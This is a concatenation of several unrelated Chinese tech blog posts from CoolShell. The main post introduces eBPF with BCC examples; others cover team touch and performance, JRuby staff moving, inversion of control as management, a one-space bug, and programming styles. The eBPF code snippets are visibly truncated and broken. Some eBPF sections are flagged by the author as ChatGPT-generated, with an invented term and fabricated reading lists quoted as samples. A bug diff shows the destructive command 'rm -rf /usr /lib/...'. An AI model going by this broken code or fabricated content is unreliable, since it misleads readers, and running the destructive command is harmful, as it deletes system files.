【 **注：我配了一张look-free的自行车，寓意为——如果不用专门的车锁，那么自行得自己锁自己！** 】（全文完）# eBPF 介绍作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn很早前就想写一篇关于eBPF的文章，但是迟迟没有动手，这两天有点时间，所以就来写一篇，这文章主要还是简单的介绍eBPF 是用来干什么的，并通过几个示例来介绍是怎么玩的，这个技术非常非常之强，Linux 操作系统的观测性实在是太强大了，并在 BCC 加持下变得一览无余。这个技术不是一般的运维人员或是系统管理员可以驾驭的，这个还是要有底层系统知识并有一定开发能力的技术人员才能驾驭的了的。 **我在这篇文章的最后给了个彩蛋。**目录* 介绍   * 用途   * 工作原理   * 示例   * 延伸阅读   * 彩蛋#### 介绍eBPF（extened Berkeley Packet Filter）是一种内核技术，它允许开发人员在不修改内核代码的情况下运行特定的功能。eBPF 的概念源自于 Berkeley Packet Filter（BPF），后者是由贝尔实验室开发的一种网络过滤器，可以捕获和过滤网络数据包。
出于对更好的 Linux 跟踪工具的需求，eBPF 从 dtrace中汲取灵感，dtrace 是一种主要用于 Solaris 和 BSD 操作系统的动态跟踪工具。与 dtrace 不同，Linux 无法全面了解正在运行的系统，因为它仅限于系统调用、库调用和函数的特定框架。在Berkeley Packet Filter (BPF)（一种使用内核 VM 编写打包过滤代码的工具）的基础上，一小群工程师开始扩展 BPF 后端以提供与 dtrace 类似的功能集。 eBPF 诞生了。 **2014 年随 Linux 3.18 首次限量发布，充分利用 eBPF 至少需要 Linux 4.4 以上版本** 。eBPF 比起传统的 BPF 来说，传统的 BPF 只能用于网络过滤，而 eBPF 则可以用于更多的应用场景，包括网络监控、安全过滤和性能分析等。另外，eBPF 允许常规用户空间应用程序将要在 Linux 内核中执行的逻辑打包为字节码，当某些事件（称为挂钩）发生时，内核会调用 eBPF 程序。此类挂钩的示例包括系统调用、网络事件等。用于编写和调试 eBPF 程序的最流行的工具链称为 BPF 编译器集合 (BCC)，它基于 LLVM 和 CLang。
eBPF 有一些类似的工具。例如，SystemTap 是一种开源工具，可以帮助用户收集 Linux 内核的运行时数据。它通过动态加载内核模块来实现这一功能，类似于 eBPF。另外，DTrace 是一种动态跟踪和分析工具，可以用于收集系统的运行时数据，类似于 eBPF 和 SystemTap。`[1]`以下是一个简单的比较表格，可以帮助您更好地了解 eBPF、SystemTap 和 DTrace 这三种工具的不同之处：`[1]`工具 | eBPF | SystemTap | DTrace   ---|---|---|---   定位 | 内核技术，可用于多种应用场景 | 内核模块 | 动态跟踪和分析工具   工作原理 | 动态加载和执行无损编译过的代码 | 动态加载内核模块 | 动态插接分析器，通过 probe 获取数据并进行分析   常见用途 | 网络监控、安全过滤、性能分析等 | 系统性能分析、故障诊断等 | 系统性能分析、故障诊断等   优点 | 灵活、安全、可用于多种应用场景 | 功能强大、可视化界面 | 功能强大、高性能、支持多种编程语言   缺点 | 学习曲线高，安全性依赖于编译器的正确性 | 学习曲线高，安全性依赖于内核模块的正确性 | 配置复杂，对系统性能影响较大
对比表格`[1]`从上表可以看出，eBPF、SystemTap 和 DTrace 都是非常强大的工具，可以用于收集和分析系统的运行情况。`[1]`#### 用途eBPF 是一种非常灵活和强大的内核技术，可以用于多种应用场景。下面是 eBPF 的一些常见用途：`[1]`* 网络监控：eBPF 可以用于捕获网络数据包，并执行特定的逻辑来分析网络流量。例如，可以使用 eBPF 程序来监控网络流量，并在发现异常流量时进行警报。`[1]`   * 安全过滤：eBPF 可以用于对网络数据包进行安全过滤。例如，可以使用 eBPF 程序来阻止恶意流量的传播，或者在发现恶意流量时对其进行拦截。`[1]`   * 性能分析：eBPF 可以用于对内核的性能进行分析。例如，可以使用 eBPF 程序来收集内核的性能指标，并通过特定的接口将其可视化。这样，可以更好地了解内核的性能瓶颈，并进行优化。`[1]`   * 虚拟化：eBPF 可以用于虚拟化技术。例如，可以使用 eBPF 程序来收集虚拟机的性能指标，并进行负载均衡。这样，可以更好地利用虚拟化环境的资源，提高系统的性能和稳定性。`[1]`总之，eBPF 的常见用途非常广泛，可以用于网络监控、安全过滤、性能分析和虚拟化等多种应用场景。`[1]`
#### 工作原理eBPF 的工作原理主要分为三个步骤：加载、编译和执行。eBPF 需要在内核中运行。这通常是由用户态的应用程序完成的，它会通过系统调用来加载 eBPF 程序。在加载过程中，内核会将 eBPF 程序的代码复制到内核空间。eBPF 程序需要经过编译和执行。这通常是由Clang/LLVM的编译器完成，然后形成字节码后，将用户态的字节码装载进内核，Verifier会对要注入内核的程序进行一些内核安全机制的检查,这是为了确保 eBPF 程序不会破坏内核的稳定性和安全性。在检查过程中，内核会对 eBPF 程序的代码进行分析，以确保它不会进行恶意操作，如系统调用、内存访问等。如果 eBPF 程序通过了内核安全机制的检查，它就可以在内核中正常运行了，其会通过通过一个JIT编译步骤将程序的通用字节码转换为机器特定指令集，以优化程序的执行速度。下图是其架构图。/filters:no_upscale\(\)/articles/gentle- linux-ebpf-introduction/en/resources/47image005-1619704397592.jpg)（图片来自：）在内核中运行时，eBPF 程序通常会挂载到一个内核钩子（hook）上，以便在特定的事件发生时被执行。例如，
* 系统调用——当用户空间函数将执行转移到内核时插入   * 函数进入和退出——拦截对预先存在的函数的调用   * 网络事件 – 在收到数据包时执行   * Kprobes 和 uprobes – 附加到内核或用户函数的探测器最后 eBPF Maps，允许eBPF程序在调用之间保持状态，以便进行相关的数据统计，并与用户空间的应用程序共享数据。一个eBPF映射基本上是一个键值存储，其中的值通常被视为任意数据的二进制块。它们是通过带有BPF_MAP_CREATE参数的`bpf_cmd`系统调用来创建的，和Linux世界中的其他东西一样，它们是通过文件描述符来寻址。与地图的交互是通过查找/更新/删除系统调用进行的总之，eBPF 的工作原理是通过动态加载、执行和检查 **无损编译** 过的代码来实现的。`[1]`#### 示例eBPF 可以用于对内核的性能进行分析。下面是一个基于 eBPF 的性能分析的 step-by-step 示例：第一步：准备工作：首先，需要确保内核已经支持 eBPF 功能。这通常需要在内核配置文件中启用 eBPF 相关的选项，并重新编译内核。检查是否支持 eBPF，你可以用这两个命令查看 `ls /sys/fs/bpf` 和 `lsmod | grep bpf`
第二步：写 eBPF 程序：接下来，需要编写 eBPF 程序，用于收集内核的性能指标。eBPF 程序的语言可以选择 C 或者 Python，它需要通过特定的接口访问内核的数据结构，并将收集到的数据保存到指定的位置。下面是一个Python 示例（其实还是C语言，用python来加载一段C程序到Linux内核）#!/usr/bin/python3from bcc import BPF     from time import sleepBPF_HASH(stats, u32);# 编译 eBPF 程序     b = BPF(text=bpf_text, cflags=["-Wno-macro-redefined"])# 加载 eBPF 程序     b.attach_kprobe(event="tcp_sendmsg", fn_name="count")name = {     0: "tcp_sendmsg"     }     # 输出统计结果     while True:     try:     #print("Total packets: %d" % b["stats"][0].value)     for k, v in b["stats"].items():     print("{}: {}".format(name[k.value], v.value))     sleep(1)     except KeyboardInterrupt:     exit()
这个 eBPF 程序的功能是统计网络中传输的数据包数量。它通过定义一个 `BPF_HASH` 数据结构来保存统计结果（eBPF Maps），并通过捕获 `tcp_sendmsg` 事件来实现实时统计。最后，它通过每秒输出一次统计结果来展示数据。这个 eBPF 程序只是一个简单的示例，实际应用中可能需要进行更复杂的统计和分析。第三步：运行 eBPF 程序：接下来，需要使用 eBPF 编译器将 eBPF 程序编译成内核可执行的格式（这个在上面的Python程序里你可以看到——Python引入了一个bcc的包，然后用这个包，把那段 C语言的程序编译成字节码加载在内核中并把某个函数 attach 到某个事件上）。这个过程可以使用 BPF Compiler Collection（BCC）工具来完成。BCC 工具可以通过命令行的方式将 eBPF 程序编译成内核可执行的格式，并将其加载到内核中。下面是运行上面的 Python3 程序的步骤：sudo apt install python3-bpfcc注：在Python3下请不要使用 `pip3 install bcc` （参看：这里）如果你是 Ubuntu 20.10 以上的版本，最好通过源码安装（否则程序会有编译问题），参看：这里：
apt purge bpfcc-tools libbpfcc python3-bpfcc     wget https://github.com/iovisor/bcc/releases/download/v0.25.0/bcc-src-with-submodule.tar.gz     tar xf bcc-src-with-submodule.tar.gz     cd bcc/     apt install -y python-is-python3     apt install -y bison build-essential cmake flex git libedit-dev   libllvm11 llvm-11-dev libclang-11-dev zlib1g-dev libelf-dev libfl-dev python3-distutils     apt install -y checkinstall     mkdir build     cd build/     cmake -DCMAKE_INSTALL_PREFIX=/usr -DPYTHON_CMD=python3 ..     make     checkinstall
接下来，需要将上面的 Python 程序保存到本地，例如保存到文件 netstat.py。运行程序：最后，可以通过执行以下命令来运行 Python 程序：$ chmod +x ./netstat.py     $ sudo ./netstat.py     tcp_sendmsg: 29     tcp_sendmsg: 216     tcp_sendmsg: 277     tcp_sendmsg: 379     tcp_sendmsg: 419     tcp_sendmsg: 468     tcp_sendmsg: 574     tcp_sendmsg: 645     tcp_sendmsg: 29程序开始运行后，会在控制台输出网络数据包的统计信息。可以通过按 Ctrl+C 组合键来结束程序的运行。下面我们再看一个比较复杂的示例，这个示例会计算TCP的发包时间（示例参考于Github上 这个issue里的程序）：#!/usr/bin/python3from bcc import BPF     import timeBPF_HASH(packets, u64, struct packet_t);
// 记录数据包的时间戳和信息     struct packet_t pkt = {}; // 结构体一定要初始化，可以使用下面的方法     //__builtin_memset(&pkt, 0, sizeof(pkt));     pkt.ts = bpf_ktime_get_ns();     pkt.size = size;     pkt.pid = pid;     pkt.saddr = sk->__sk_common.skc_rcv_saddr;     pkt.daddr = sk->__sk_common.skc_daddr;     struct inet_sock *sockp = (struct inet_sock *)sk;     pkt.sport = sockp->inet_sport;     pkt.dport = sk->__sk_common.skc_dport;packets.update(&id, &pkt);     return 0;     }// 获取数据包的时间戳和编号     struct packet_t *pkt = packets.lookup(&id);     if (!pkt) {     return 0;     }
// 计算传输时间     u64 delta = bpf_ktime_get_ns() - pkt->ts;// 统计结果     bpf_trace_printk("tcp_time: %llu.%llums, size: %llu\\n",     delta/1000, delta%1000%100, pkt->size);// 删除统计结果     packets.delete(&id);return 0;     }     """# 编译 eBPF 程序     b = BPF(text=bpf_text, cflags=["-Wno-macro-redefined"])# 注册 eBPF 程序     b.attach_kprobe(event="tcp_sendmsg", fn_name="on_send")     b.attach_kprobe(event="tcp_v4_do_rcv", fn_name="on_recv")# 输出统计信息     print("Tracing TCP latency... Hit Ctrl-C to end.")     while True:     try:     (task, pid, cpu, flags, ts, msg) = b.trace_fields()     print("%-18.9f %-16s %-6d %s" % (ts, task, pid, msg))     except KeyboardInterrupt:     exit()
上面这个程序通过捕获每个数据包的时间戳来统计传输时间。在捕获 `tcp_sendmsg` 事件时，记录数据包的发送时间；在捕获 `tcp_v4_do_rcv` 事件时，记录数据包的接收时间；最后，通过比较两个时间戳来计算传输时间。从上面的两个程序我们可以看到，eBPF 的一个编程的基本方法，这样的在Python里向内核的某些事件挂载一段 “C语言” 的方式就是 eBPF 的编程方式。实话实说，这样的代码很不好写，而且有很多非常诡异的东西，一般人是很难驾驭的（上面的代码我也不是很容易都能写通的，把 Google 都用了个底儿掉，读了很多晦涩的文档……）好在这样的代码已经有人写了，我们不必再写了，在 Github 上的 bcc 库下的 tools 目录有很多……BCC（BPF Compiler Collection）是一套开源的工具集，可以在 Linux 系统中使用 BPF（Berkeley Packet Filter）程序进行系统级性能分析和监测。BCC 包含了许多实用工具，如：1. bcc-tools：一个包含许多常用的 BCC 工具的软件包。   2. bpftrace：一个高级语言，用于编写和执行 BPF 程序。   3. tcptop：一个实时监控和分析 TCP 流量的工具。   4. execsnoop：一个用于监控进程执行情况的工具。   5. filetop：一个实时监控和分析文件系统流量的工具。   6. trace：一个用于跟踪和分析函数调用的工具。   7. funccount：一个用于统计函数调用次数的工具。   8. opensnoop：一个用于监控文件打开操作的工具。   9. pidstat：一个用于监控进程性能的工具。   10. profile：一个用于分析系统 CPU 使用情况的工具。
下面这张图你可能见过多次了，你可以看看他可以干多少事，内核里发生什么事一览无余。#### 延伸阅读一些经典的文章和书籍关于 eBPF 包括：* Brendan Gregg 的《BPF Performance Tools: Linux System and Application Observability》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。   * eBPF 的官网： 由 Cilium 建立   * Cilium’s BPF and XDP Reference Guide   * BPF Documentation   * BPF Design Q&A   * 还有 Github 上的 Awesome eBPF#### 彩蛋最后来到彩蛋环节。因为最近 ChatGPT 很火，于是，我想通过 ChatGPT 来帮助我书写这篇文章，一开始我让ChatGPT 帮我列提纲，并根据提纲生成文章内容，并查找相关的资料，非常之顺利，包括生成的代码，我以为我们以很快地完成这篇文章。但是，到了代码生成的时候，我发现，ChatGPT 生成的代码的思路和方法都是对的，但是是比较老的，而且是跑不起来的， **出现了好些低级错误，如：使用了未声明的变量，没有引用完整的C语言的头文件，没有正确地初始化变量，错误地获取数据，类型没有匹配……等等** ，在程序调试上，挖了很多的坑，C语言本来就不好搞，挖的很多运行时的坑很难察觉，所以，耗费了我大量的时间来排除各种各样的问题，其中有环境上的问题，还有代码上的问题，这些问题即便是通过 Google 也不容易找到解决方案，我找到的解决方案都放在文章中了，尤其是第二个示例，让我调试了3个多小时，读了很多 bcc 上的issue和相关的晦涩的手册和文档，才让程序跑通。
到了文章收关的阶段，我让ChatGPT 给我几个延伸阅读，也是很好的，但是没有给出链接，于是我只得人肉 Google 了一下，然后让我吃惊的是， **好多ChatGPT给出来的文章是根本不存在的，完全是它伪造的** 。我连让它干了两次都是这样，这个让我惊掉大牙。这让我开始怀疑它之前生成的内容，于是，我不得我返回仔细Review我的文章，尤其是“介绍”、“用途”和“工作原理”这三个章节，基本都是ChatGPT生成的，在Review完后，我发现了ChatGPT 给我生造了一个叫 “无损编译器”的术语，这个术语简直了，于是我开始重写我的文章。我把一些段落重写了，有一些没有，保留下来的我都标记上了 `[1]`，大家读的时候要小心阅读。最后， **我的结论是，ChatGPT只是一个不成熟的玩具，只能回答一些没有价值的日常聊天的问题，要说能取代Google，我觉得不可能，因为Google会基于基本的事实，而ChatGPT会基于内容生成的算法，在造假方面称得上是高手，可以列为电信诈骗的范畴了，我以后不会再使用ChatGPT生成文章内容或是作我的帮手了。StackOverflow把其ban了真是不能太赞了！**
**附件一：ChatGPT的造假载图和样本**点击看大图 |点击看大图   ---|---**ChatGPT 生成的样本一*** Brendan Gregg 的《BPF Performance Tools: Linux System and Application Observability》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。   * Alexei Starovoitov 在 2015 年的 LPC 大会上发表的《eBPF and XDP: fast programmable datapath in the Linux kernel》一文，是一个介绍 eBPF 和 XDP（eXpress Data Path）的综述。   * 谷歌的《BPF: The Future of Linux Monitoring and Observability》一文介绍了 eBPF 的基本概念，并探讨了它对于 Linux 监控和可观察性的影响。   * 微软的《A Survey of Techniques for Hardware Acceleration of BPF》一文，介绍了 eBPF 在硬件加速方面的研究现状。   * Daniel Borkmann 的《Linux kernel networking: implementation and theory》一书涵盖了 eBPF 的实现和理论。   * Martin KaFai Lau 在 2015 年的 SOSP 大会上发表的《eBPF: a new execution environment for the Linux kernel》一文，介绍了 eBPF 在 Linux 内核中的新执行环境。   * 来自两名谷歌工程师的《eBPF: A New Frontier in Performance Analysis》一文，探讨了 eBPF 对性能分析的影响。   * 《BPF Performance Tools: Linux System and Application Observability》一书中的第三章，讨论了 eBPF 的编译器和运行时系统。   * 来自三名谷歌工程师的《eBPF: The New Solaris DTrace》一文，比较了 eBPF 和 Solaris DTrace 系统的区别。
**ChatGPT 生成的样本二**1. eBPF 程序开发指南（）   2. eBPF 官方文档（）   3. Linux 内核 eBPF 介绍（）   4. eBPF 性能优化技巧（）   5. eBPF 实战经验分享（）   6. eBPF 在网络安全中的应用（）   7. eBPF 实现 Linux 系统性能监控（）   8. eBPF 入门教程（）   9. eBPF 与 BPF 比较（）   10. eBPF 提高课程（）**附件二：发明的术语：无损编译器**点击看大图 |点击看大图   ---|---（全文完）# 碰触，合作和团队绩效作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn公司有时候会举行团队建设活动，让大家出去跋山涉水，一起做有肢体接触游戏（例如用废报纸和胶布搭建一个能把所有人容下的遮阳棚）。这其中是有道理的。今日读到一篇加州伯克利大学的文章 touch, cooperation, and performance, 用科学的研究方法解释了为什么NBA球员们为什么要“high five（击掌）”，并用统计方法论证了碰触行为可以导致更好的比赛成绩。其实想想，其实人们握手，鼓励式地拍肩膀，引导别人进门的时候好客地推别人的背，道理都是一样。身体接触（符合社交礼仪范围的）是建立信任的一种微妙行为。这些大多不会写在领导力的书里。
猴子之间互相捉虱子梳理毛发不是为了营养，而是增进群体的凝聚力。人类口头上的语言的第一功能不是为了表达知识，而是为了促进社会联系，其内容并不需要都是重要信息。这就是为什么我们一天之内说话内容的80%其实都是扯淡，八卦和闲聊。（注意：职场上有社交礼仪，此方法需要适度）# JRuby核心成员投奔Engine Yard作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn新闻来源：Computer WorldSun公司的JRuby团队正在离开他们的老东家Sun，投奔Engine Yard公司。他们声称这是因为Oracle并购Sun后的前途不明朗的原因。Sun的新闻发言人已确定了这一消息的真实性。在两年半前，Sun招募了Charles Nutter 和Thomas Enebo，这两人叫“the JRuby Guys”，他们主要实现在Java虚似机上运行Ruby，后来Sun又招了一个叫Nick Sieger的人。今天，这三个核心开发人员会在下周一的时候到新公司上班。他们认为Oracle可能会不支持他们继续在JVM上运行Ruby这个事情，而JRuby又是他们的未来。
Engine Yard。成立仅两年、总部设在旧金山的Engine Yard，主要业务是为使用开放原始码开发环境Ruby on Rails的开发者处理系统布署和作业等事项。该公司协助开发者透过所谓的云计算，或第三方数据中心，执行应用软件。Engine Yard曾经从New Enterprise Associates和Amazon.com两家公司募得投资1500万美元。该公司正在进行云计算平台上的Rails计划。EngineYard公司的市场部副总裁Michael Mullany说，他们这所以招募了他们，是因为他们觉得JRuby的用户数量在增加，而他们公司并没有这方面的专业知识。并且，展示了JRuby在过去一年有40%的增涨态势。这个副总裁还说，JRuby的下一个阶段会是一个专业的开源的JRuby，但技术支持将是收费的。Nick Sieger在Sun公司是 Kenai 项目的leader，他说下一代的JRuby将会允许开发人员以云的方式host他们的应用，就像SourceForge一样。JRuby 的第四个核心开发者 Ola Bini，自从去年被ThoughtWorks招募后，还在那里工作。
Nutter说，JRuby的下一个版本是1.4，会在今年9月份发布，在这个版本，他们会让JRuby成为JVM上的一等公民，并让其成为JVM上最好的语言。当然，也会处理一些和Engine Yard相关的东西。（全文完）# IoC/DIP其实是一种管理思想作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn关于IoC的的概念提出来已经很多年了，其被用于一种面象对像的设计。我在这里再简单的回顾一下这个概念。我先谈技术，再说管理。话说，我们有一个开关要控制一个灯的开和关这两个动作，最常见也是最没有技术含量的实现会是这个样子：然后，有一天，我们发现需要对灯泡扩展一下，于是我们做了个抽象类：但是，如果有一天，我们发现这个开关可能还要控制别的不单单是灯泡的东西，我们就发现这个开关耦合了灯泡这种类别，非常不利于我们的扩展，于是反转控制出现了。就像现实世界一样，造开关的工厂根本不关心要控制的东西是什么，它只做一个开关应该做好的事，就是把电接通，把电断开（不管是手动的，还是声控的，还是光控，还是遥控的），而我们的造各种各样的灯泡（不管是日关灯，白炽灯）的工厂也不关心你用什么样的开关，反正我只管把灯的电源接口给做出来，然后，开关厂和电灯厂依赖于一个标准的通电和断电的接口。于是产生了IoC控制反转，如下图：
**所谓控制反转的意思是，开关从以前的设备的专用开关，转变到了控制电源的开关，而以前的设备要反过来依赖于开关厂声明的电源连接接口。只要符合开关厂定义的电源连接的接口，这个开关可以控制所有符合这个电源连接接口的设备** 。 **也就是说，开关从依赖设备这种情况，变成了，设备反过来依赖于开关所定义的接口** 。只要你看过我的那篇《面向对象设计其实和面象对象一点关系也没有》，你就知道这样的例子在生活中太多见了。比如说：1）在交易的过程中，卖家向买家卖东西，一手交钱一手交货，所以，基本上来说卖家和买家必需强耦合（必需见面）。这个时候，银行出来做担保，买家把钱先垫到银行，银行让卖家发货，买家验货后，银行再把钱打给卖家。这就是反转控制。买卖双方把对对方的直接控制，反转到了让对方来依赖一个标准的交易模型的接口。股票交易也是一样的，证交所就是买卖双方的标准交易模型接口。2）上面这个例子，可能还不明显，再举一个例子。海尔公司作为一个电器制商需要把自己的商品分销到全国各地，但是发现，不同的分销渠道有不同的玩法，于是派出了各种销售代表玩不同的玩法，随着渠道越来越多，发现，每增加一个渠道就要新增一批人和一个新的流程，严重耦合并依赖各渠道商的玩法。实在受不了了，于是制定业务标准，开发分销信息化系统，只有符合这个标准的渠道商才能成为海尔的分销商。让各个渠道商反过来依赖自己标准。反转了控制，倒置了依赖。
**可见，控制反转和依赖倒置不单单的一种设计模式，反而更是一种管理模式。**在大公司中，有很多很多的团队，这些团队开发的软件有很多依赖，跨团队合作是一件挺麻烦的事情，下面是一些比较真实的示例：1）一个网页会有很多频道，于是，我们的前端工程师进入到各个页面为各种频道开发他们的页面，随着频道越来越多，前端开发工程师的人数也越来越多，每增加一个频道，就要增加一个为这个频道服务的前端团队，于是，人数越来越多，干成了劳动密集型。为什么不反转控制，倒置依赖呢？前端的同学完全可以开发出各种页面的标准组件，布局，模板，以前与后端交互框架，然后，让后端的同学反过来依赖于前端的标准，使用前端的框架，前端的布局，模板，和组件，以向前端接入后端的模块。2）一个平台需要接入各种各样的业务系统，这些垂直业务系统都有自己的账号体系，于是这个平台为了要兼这些垂直系统的账号体系以做到权限控制，需要做各个系统和自己系统中的账号映射，并为账号和分配出来的资源设置各垂直系统的标识，还要在自己的代码中要写很多很多的依赖于各种账号体系的代码。其实，一个依赖倒置和反转控制就很简单。开发一个权限体系标准，让接入方的账号系统反过来依赖并控制这个标准的权限系统，从而做出一个干净的系统。
3）还有一个云平台中的管理模式，一些底层服务的开发团队只管开发底层的技术，然后什么也不管了，就交给上层的开发人员，在底层团队的开发出来的产品上面开发各种管理这个底层资源的东西，比如：生产底层资源的业务，底层资源的控制台，底层资源的监控系统。这个让底层团队只干纯技术，不干与底层技术无关的东西，看似很科学，其实是做错了。因为，上层为各个云资源控制生产，开发控制台和监控的团队，随着接入的资源的越来越多，完全干不过来了，苦逼得一塌糊涂，因为底层的资源千差百怪，每接一个就要开发一堆这个产品的代码。这个时候依赖倒置和反转控制又可以解决问题了。很简单，上层为各个云资源控制生产，开发控制台，和监控的团队应该制定一个标准，让底层的IaaS云资源开发团队反过来依赖这个标准，统一接入方式，如果开发的云资源不符我的生产控制模型，没有控制台，不把监控数据喂入我的监控系统，对不起，请不要接入我这个PaaS平台。4）一个集中式的处理电子商务中的订单的流程。各个垂直业务线都需要通过这个平台来处理自己的交易业务，但是垂直业务线上的个性化需求太多。于是，这个技术平台开始出现了黑魔法——“为了害怕改变数据库表结构，不得不在数据库中预留一些字段，里面存把业务方的个性化字段存成如JSON这样的东西”，并为之自豪认为可以快速解决业务问题（WTF）。然而，恶梦并没就此结束，管理这个技术平台的小组开始发现，对来自各个业务方的需求应接不暇，各种变态需求严重干扰系统，各种技术决定越来越不好做，导致需求排期排不过来。于是，不单单得到了各个业务方的各种抱怨，最可怕的是还有高层老大们压过来的Deadline，加班加点，苦逼之极，最后业务方自己要去一个自己的平台。为什么不用依赖倒置和反转控制的思想呢？开发一个插件模型、工作流引擎和Pub/Sub系统，让业务方的个性化需求可以以插件的方式插入我的订单流程中，业务方自的数据存在自己的库中，业务逻辑也不要侵入我的系统，并可以使用工作流引擎或Pub/Sub的协义标准来自己定义工作流的各个步骤（甚至把工作流引擎的各个步骤的Decider交给各个业务方自行处理）。让各个业务方来依赖于我的标准插件和工作流接口，反转迭控制，让他们来控制我的系统，依赖倒置，让他们来依赖我的标准。（这个团队想过把自己的系统内部开源出去让别的团队也进来参与，可以是可以，但一定要用Linux/Git这种方式，允许出现多个分支，多个发行版。但多个版本又造成了多个业务平台，这会上上层垂直业务不知所措）
5）看过《SteveY对Amazon和Google平台的吐槽》的人都知道，Amazon内部系统的SOA架构（这个SOA架构离IBM定义的那个非常变态的SOA还有一定距离），但是这基本上都是依赖倒置和控制反转的思路了—— **与其让我来帮你实现你的业务逻辑，不如把我的业务逻辑开放成服务的方式让你来控制** 。6）再说一个我在Amazon经历的例子。有一个项目是在给Amazon的各个商区（Marketplace）做国际出口的业务，我们先把Media类的产品（书，DVD之类的）做国际出口开放，项目不难，就是让商家同意一个法律协议（上传自己的签名），然后后台小改一下。美国的，欧洲的做的都没有问题，物流团队在出口报关单上打的都是Amazon仓库的地址和商家的签名（本来这就是错的，打的应该是商家的地址和商家的签名），但是到了日本，就出了问题，因为日本海关即要日文信息，也要商家的英文名和英文地址，而我们的系统里面只有商家的日文信息。本来，这是一个挺简单的事——数据库里加两个字段，在那个同意条款的网页上收集一下商家的英文名和地址，然后把这些信息传给后面的物流团队。物流团队一看这个，发现搞不了，因为他还要传给仓库，N多的地方都要加这两个字段，还要写下各种if (site == JP)这样的判断。物流团队不蛮干，重新设计自己的系统。做一个Document Template的东西，这个就是那个那个要贴在物流盒子上的单子。再也不让各个业务团队把那些信息传过来，而是把这个Document Template的东西传给上面的业务方，他们想怎么写就怎么写， 写完后，把这个东西传回来。于是，大家依赖了一个标准的协议，而不是一其字段。（当然，这个改动过多，为此改了半年多，不过非常值）
所以说啊，在跨团队的工作中，* 如果依赖和控制的东西过多了，就需要制定标准，倒置依赖，反转控制。* 控制欲望最好不要太强，不要想着能干所有的事情，要学会控制反转和依赖倒置原则。否则只会引火烧身。* 反转控制和依赖倒置是一种智慧。（全文完）# 一个空格引发的惨剧作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn你是否相信如果你的程序里没有检查一个变量会导致怎么系统瘫痪？无论你相不相信，这是我一个亲身经历过的案例，你可以在本站的程序员那些悲催的事儿中找到很多这样的事。这样的事昨天在发生，今天同样在发生。Unix40多年")了，在这40年里，程序员发生过各种各样的的惨剧，但是大多数的事情一而再再而三的重演。今天的你，可能在开发者各种各样NB的系统，你会相信你的一个空格也能导致系统瘫痪吗？也许你可能很难相信这个事。不过，再下面这个事将告诉你这个血淋淋的事实 —— 一个空格产生的bug可以让你的系统瘫痪。bumblebee是一个开源项目，这个名字也就是变形金刚里的大黄蜂，这个项目是这样介绍自己的——> bumblebee is Optimus support for Linux, with real offloading, and not > switchable graphics.. More important.. it works on Optimus Laptops without a > graphical multiplexer..
Optimus 是NVIDIA的“优驰”技术，其可以将您的笔记本电脑PC提升到绝佳状态，提供出色的图形性能，并在需要时延长电池续航时间。这个项目是把这个技术移到Linux上来。这个项目本来不出名，不过，程序在其安装脚本install.sh里的一个bug让这个项目一下子成了全世界最瞩目的项目，这个bug的fix如下：@@ -348,7 +348,7 @@ case "$DISTRO" in     -  rm -rf /usr /lib/nvidia-current/xorg/xorg     +  rm -rf /usr/lib/nvidia-current/xorg/xorg看明白了吗？ **空格** 。这个空格会导致什么样的问题呢？呵呵。你有没有感到菊花一紧？这个bug绝对的霸气外露！真是验证了“如何写出无法维护代码”的那句话——“ **测试你的程序是一种懦夫的行为** ”。不过，最精彩还不是这个bug，而是全世界程序员的对这个bug 的 code review comments，真的相当的欢乐。请强势围望！重点是其中的很多图片——下面的图片众多。!clip_image001!clip_image002
!clip_image007!clip_image010!clip_image011!clip_image012!clip_image014!clip_image016!clip_image019!clip_image020!clip_image021(全文完)# 各种流行的编程风格作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在过去的N年中，我遇到了很多使用囧然不同风格的开发者，下面是我所知道的一些，你还知道其它的吗？目录* 散弹枪编程   * 撞大运编程   * Cargo-Cult 编程   * 刻舟求剑编程   * 设计模式驱动型编程   * 侦探型编程   * 屠宰式编程#### 散弹枪编程这种编程风格是一种开发者使用非常随意的方式对待代码。“嗯，这个方法调用出错了……那么我会试着把传出的参数从 **false** 变成 **true**!”，当然依然出错，于是我们的程序员会这样：“好吧，那我就注释掉整个方法吧”，或是其它更为随意的处理方式，直到最后让这个调用成功。或是被旁边的某个程序员指出一个正确的方法。如果我们把一个正规的程序员和一个撞大运的程序员放在一起做结地，那么，那个正规的程序可以马上变得发疯起来，并且，可以把正规的程序员的智商降到最低。两个撞大运的程序员不应该在一起做结对编程，这是因为他们破坏性的才能会造成的伤害会比只有一个还差。
#### 撞大运编程这是一种比散弹枪编程要温和一些的编程方式，我相信这种方式可能会是大多数程序员都会使用的方式。这种编程方式经常出现于程序员并不确切知道他们在干什么，也不知道所写的程序的本质和实际，但是可以让程序工作起来。他们以一种撞大运的方式在写程序，某些时候，他们根本就不知道某个错误的原因，就开始稀里糊涂地修改代码。一旦出现问题，他们会用两条路：1）停下来，理解一下程序，找到出错的原因。2）使用散弹枪编程方式开始解决问题。测试驱动开发（Test Driven Development）是一种可以用来拯救上百万的撞大运编程的程序员。于是，他们有了一个更为NB的借口：只要我的程序通过测试了，你还有什么话好说？别骂我，测试驱动开发是一个不错的事物，其主要是用来控制撞大运开发所带来的问题。####   Cargo-Cult 编程关于Cargo Cults 这个词儿来自二战期间的某些太平洋上小岛里的土著人。在战争期间，美国利用这些小岛作为太平洋战场上的补给站。他们在这些小岛上修建自己的飞机跑道以用来运输战争物资。而那些小岛上的土著人从来没有见过飞机，当他们看到飞机的时候，觉得相当的牛，可以为那些白人带来各种各样的物品和食物。当二战结束后，那些土著人仿照着修建了飞机跑道，并用竹子修建了塔台。然后就在那期望着有飞机为他们送来物品和食物。
